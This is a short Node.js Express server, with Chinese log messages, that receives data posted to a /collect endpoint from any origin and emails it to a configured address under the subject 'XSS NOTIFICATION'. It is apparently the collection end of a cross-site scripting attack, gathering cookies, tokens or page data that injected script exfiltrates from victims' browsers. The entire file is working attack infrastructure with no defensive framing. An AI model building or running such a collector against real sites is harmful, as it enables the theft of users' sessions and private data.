import express from "express";
import nodemailer from "nodemailer";
import cors from "cors";
import config from "./config.js";

const app = express();
app.use(cors());
app.use(express.text());

const transporter = nodemailer.createTransport(config.smtp);

app.post("/collect", async (req, res) => {
    try {
        await transporter.sendMail({
            from: config.smtp.auth.user,
            to: config.notifyTo,
            subject: "XSS NOTIFICATION",
            text: req.body,
        });
        console.log("邮件发送成功");
    } catch (err) {
        console.error("邮件发送失败:", err.message);
    }
    res.status(200).end();
});

app.listen(config.port, "0.0.0.0", () => {
    console.log(`运行在 port ${config.port}`);
});
